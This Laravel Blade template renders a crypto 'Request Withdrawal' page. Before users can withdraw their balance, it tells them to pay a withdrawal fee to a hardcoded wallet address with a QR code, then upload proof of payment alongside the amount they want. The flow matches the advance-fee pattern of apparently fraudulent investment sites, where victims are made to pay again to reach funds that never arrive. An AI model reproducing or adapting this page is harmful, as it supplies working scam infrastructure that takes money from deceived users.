@section('title', 'Request Withdrawal')
<x-home-layout>
    @vite('resources/css/app.css')


    <div class="no-bottom no-top" id="content">
        <div id="top"></div>

        <!-- section begin -->
        <section id="subheader" class="text-light"
            data-bgimage="url(/template/assets/images/background/subheader.jpg) top">
            <div class="relative text-center center-y">
                <div class="container">
                    <div class="row">

                        <div class="text-center col-md-12">
                            <h1 class='text-[2.5rem] md:text-[4rem] font-bold'>Request Withdrawal</h1>
                        </div>
                        <div class="clearfix"></div>
                    </div>
                </div>
            </div>
        </section>
        <!-- section close -->

        <!-- section begin -->
        <section aria-label="section" class="py-12 ">
            <div class="container px-4 mx-auto">
                <div class="max-w-2xl mx-auto text-center">
                    <div class="mb-6">
                        <h3 class="text-3xl font-bold text-indigo-600">Withdrawal - Amount</h3>
                        <p class="mt-2 text-gray-600">
                            Enter the amount you wish to withdraw from your balance.
                        </p>
                    </div>
                </div>
                <!-- Wallet Address -->
                <div class="p-4 mb-4 text-center bg-gray-100 rounded-lg">
                    <p class="font-semibold text-gray-700">Make your withdrawal fee payment to the following wallet address:</p>
                    <input type="text" value="0x66c51220d48ccCA297cC98C51BBFAaC37C416e6e" readonly
                        class="w-full p-3 mt-2 font-semibold text-center text-indigo-600 bg-indigo-100 border border-indigo-300 rounded-lg">
                </div>

                <!-- QR Code / Image -->
                <div class="flex justify-center mb-4">
                    <img src="/template/assets/images/wallet/qrcode.jpeg" alt="QR Code"
                        class="object-cover w-40 h-40 rounded-lg shadow-md">
                </div>

                <div class="max-w-xl p-6 mx-auto bg-white rounded-lg shadow-md">
                    <form action="{{ route('withdraw') }}" method="POST" class="space-y-4"
                        enctype="multipart/form-data">
                        @csrf
                        <label for="wphrase" class="block font-semibold text-gray-700">
                            Amount to be Withdrawn
                        </label>
                        <hr class="border-gray-300">

                        <input type="number" id="wphrase" name="amount"
                            class="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-600">
                        @error('amount')
                            <p class="my-2 text-danger">{{ $message }}</p>
                        @enderror

                        <!-- Proof of Payment Upload -->
                        <label for="proof_of_payment" class="block font-semibold text-gray-700">Proof of Payment</label>
                        <hr class="border-gray-300">

                        <input type="file" name="proof_of_payment" id="fileInput" accept="image/*"
                            class="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-600">
                        @error('proof_of_payment')
                            <p class="my-2 text-danger">{{ $message }}</p>
                        @enderror
                        <input type="submit" value="Submit"
                            class="w-full py-3 font-semibold text-white transition bg-indigo-600 rounded-lg cursor-pointer hover:bg-indigo-700">
                    </form>
                </div>
            </div>
        </section>


    </div>
</x-home-layout>
